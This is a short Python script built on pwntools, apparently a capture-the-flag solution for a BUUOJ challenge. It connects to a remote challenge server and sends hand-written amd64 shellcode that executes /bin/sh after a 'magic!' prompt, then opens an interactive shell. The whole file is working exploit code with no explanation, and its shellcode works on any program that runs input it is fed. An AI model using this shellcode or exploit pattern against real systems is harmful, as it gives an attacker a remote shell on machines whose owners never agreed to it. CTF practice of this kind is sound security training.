from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'

r = remote('node5.buuoj.cn', 26206)

shellcode = asm(shellcraft.sh())
shellcode2 = asm('''
    mov rbx, 0x68732f6e69622f
    push rbx
    push rsp
    pop rdi
    xor esi, esi
    xor edx, edx
    push 0x3b
    pop rax
    syscall
''')
r.sendlineafter(b'magic!', shellcode2)
r.interactive()

